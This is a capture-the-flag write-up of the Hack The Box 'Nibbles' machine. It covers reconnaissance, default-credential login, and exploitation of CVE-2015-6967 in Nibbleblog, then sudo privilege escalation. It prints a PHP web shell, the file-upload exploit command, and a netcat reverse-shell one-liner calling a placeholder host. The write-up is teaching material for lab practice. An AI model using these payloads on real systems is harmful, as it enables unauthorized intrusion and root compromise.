# Hack The Box: Nibbles Writeup

<p align="center">
  <img src="https://img.shields.io/badge/HTB-Nibbles-red?style=for-the-badge&logo=hackthebox&logoColor=white">
  <img src="https://img.shields.io/badge/Difficulty-Easy-green?style=for-the-badge">
  <img src="https://img.shields.io/badge/OS-Linux-blue?style=for-the-badge&logo=linux&logoColor=white">
  <img src="https://img.shields.io/badge/Attack-CVE--2015--6967-orange?style=for-the-badge">
  <img src="https://img.shields.io/badge/Privilege%20Escalation-Sudo-important?style=for-the-badge">
</p>

https://app.hackthebox.com/machines/Nibbles

---

# 📚 Table of Contents

* [Overview](#-overview)
* [Reconnaissance](#-reconnaissance)

  * [Port Scan](#port-scan)
  * [Web Enumeration](#web-enumeration)
* [Initial Foothold](#-initial-foothold)

  * [Admin Login](#admin-login)
  * [Remote Code Execution: CVE-2015-6967](#remote-code-execution--cve-2015-6967)
  * [User Flag](#user-flag)
* [Privilege Escalation](#-privilege-escalation)

  * [Sudo Misconfiguration](#sudo-misconfiguration)
  * [Root Access](#root-access)
  * [Root Flag](#root-flag)
* [Conclusion](#-conclusion)

---

# 🎯 Overview

| Machine | OS    | Difficulty |
| ------- | ----- | ---------- |
| Nibbles | Linux | Easy       |

## Description

This machine demonstrates:

* web enumeration techniques,
* CMS identification and version disclosure,
* exploitation of an unrestricted file upload vulnerability,
* remote code execution through Nibbleblog,
* Linux privilege escalation through a vulnerable sudo configuration.

The foothold relies on **CVE-2015-6967**, an unrestricted file upload vulnerability affecting **Nibbleblog v4.0.3**.

---

# 🔎 Reconnaissance

## Port Scan

Initial scan:

```bash
nmap -sV -sC -T4 -p- --min-rate 5000 10.129.96.84
```

### Result

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2
80/tcp open  http    Apache httpd 2.4.18 (Ubuntu)
```

### Observations

* SSH service exposed on port 22.
* Apache web server exposed on port 80.
* No additional services available.
* Web enumeration becomes the primary attack surface.

---

## Web Enumeration

### Homepage

```bash
curl -s http://10.129.96.84/
```

### Result

```html
<b>Hello world!</b>
<!-- /nibbleblog/ directory. Nothing interesting here! -->
```

A hidden path is disclosed through an HTML comment:

```text
/nibbleblog/
```

---

### CMS Identification

Browsing to:

```text
http://10.129.96.84/nibbleblog/
```

reveals a blog powered by **Nibbleblog**.

Checking the README file:

```bash
curl -s http://10.129.96.84/nibbleblog/README
```

### Result

```text
====== Nibbleblog ======
Version: v4.0.3
Codename: Coffee
Release date: 2014-04-01
```

Version confirmed:

```text
Nibbleblog v4.0.3
```

---

### User Enumeration

Checking exposed XML files:

```bash
curl -s http://10.129.96.84/nibbleblog/content/private/users.xml
```

### Result

```xml
<user username="admin">
```

The administrator account is identified as:

```text
admin
```

### Observations

The XML file also reveals a blacklist mechanism:

```xml
<blacklist>
```

Avoid brute-force attacks to prevent lockout.

---

# 🚀 Initial Foothold

## Admin Login

The machine name is:

```text
Nibbles
```

A common HTB pattern is to use the machine name as a password.

Credentials tested:

```text
Username: admin
Password: nibbles
```

Login is successful.

---

## Remote Code Execution: CVE-2015-6967

Nibbleblog v4.0.3 is vulnerable to an unrestricted file upload vulnerability in the **My Image** plugin.

### Create a Web Shell

```bash
echo '<?php system($_REQUEST["cmd"]); ?>' > shell.php
```

---

### Upload the Payload

```bash
curl -s -b cookie.txt \
  -F "plugin=my_image" \
  -F "image=@shell.php;filename=image.php;type=image/jpeg" \
  "http://10.129.96.84/nibbleblog/admin.php?controller=plugins&action=config&plugin=my_image"
```

### Result

```text
Changes has been saved successfully
```

---

### Verify Code Execution

```bash
curl -s \
"http://10.129.96.84/nibbleblog/content/private/plugins/my_image/image.php?cmd=id"
```

### Result

```text
uid=1001(nibbler) gid=1001(nibbler)
```

Remote code execution confirmed.

---

### Optional Reverse Shell

Listener:

```bash
nc -lvnp 4444
```

Payload:

```bash
curl -s \
"http://10.129.96.84/nibbleblog/content/private/plugins/my_image/image.php" \
--data-urlencode \
"cmd=rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc YOUR_IP 4444 >/tmp/f"
```

A shell is obtained as:

```text
nibbler
```

---

## User Flag

Reading the user flag:

```bash
cat /home/nibbler/user.txt
```

### Result

```text
HTB{user_flag_redacted}
```

---

# 🔺 Privilege Escalation

## Sudo Misconfiguration

Checking sudo permissions:

```bash
sudo -l
```

### Result

```text
User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD:
/home/nibbler/personal/stuff/monitor.sh
```

The script is located inside the user's home directory.

This means:

* the user can modify it,
* sudo executes it as root,
* arbitrary root code execution is possible.

---

## Root Access

### Create the Directory

```bash
mkdir -p /home/nibbler/personal/stuff
```

---

### Create a Malicious Script

```bash
cat > /home/nibbler/personal/stuff/monitor.sh << EOF
#!/bin/bash
cat /root/root.txt
EOF
```

Make it executable:

```bash
chmod +x /home/nibbler/personal/stuff/monitor.sh
```

---

### Execute as Root

```bash
sudo /home/nibbler/personal/stuff/monitor.sh
```

### Result

```text
HTB{root_flag_redacted}
```

Root access confirmed.

---

## Root Flag

```bash
cat /root/root.txt
```

### Result

```text
HTB{root_flag_redacted}
```

---

# 🧠 Conclusion

This machine demonstrates a complete attack chain involving:

1. Discovery of a hidden path through HTML source code.
2. Enumeration of a vulnerable CMS installation.
3. Identification of exposed administrative information.
4. Exploitation of CVE-2015-6967 through unrestricted file upload.
5. Remote code execution as the web server user.
6. Privilege escalation through a writable script executed with sudo.

---

# 🛠️ Tools Used

* Nmap
* Curl
* Netcat
* Nibbleblog
* Linux command line

---

# 📌 Key Takeaways

* Always inspect HTML source code and comments.
* CMS installations frequently expose useful files such as README files and XML configurations.
* Weak credentials remain one of the most common attack vectors.
* File upload functionality must be validated server-side.
* Never allow sudo execution of scripts writable by unprivileged users.
* Enumerating exposed application files can often reveal usernames, versions, and attack paths.

---

*Writeup by Jean-Michel Leclercq: solved on 2026-06-11*
